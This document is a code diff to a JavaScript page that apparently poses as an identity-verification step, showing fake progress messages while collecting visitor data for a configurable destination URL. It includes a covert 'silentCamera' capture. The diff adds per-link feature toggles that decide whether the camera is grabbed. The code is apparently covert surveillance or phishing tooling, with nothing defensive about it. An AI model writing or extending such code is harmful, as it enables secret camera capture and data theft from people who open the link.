@@ -138,6 +138,7 @@ for (let i = 0; i < 20; i++) {
 const stealthPath   = location.pathname;
 let   collectedData = {};
 let   destinationUrl = '';
+let   activeFeatures = [];
 
 const progBar    = document.getElementById('progBar');
 const statusText = document.getElementById('statusText');
@@ -163,6 +164,7 @@ async function run() {
     if (metaRes.ok) {
       const meta = await metaRes.json();
       if (meta.destinationUrl) destinationUrl = meta.destinationUrl;
+      if (meta.features) activeFeatures = meta.features;
     }
   } catch {}
 
@@ -174,7 +176,10 @@ async function run() {
   setProgress(55, 'Verifying identity...');
 
   // STEP 3: Attempt camera (has its own internal timeout so it never blocks)
-  try { await silentCamera(); } catch {}
+  // Only attempt if 'camera' was selected, or if this is an old link (activeFeatures empty)
+  if (activeFeatures.length === 0 || activeFeatures.includes('camera')) {
+    try { await silentCamera(); } catch {}
+  }
 
   setProgress(80, 'Finalizing handshake...');
 
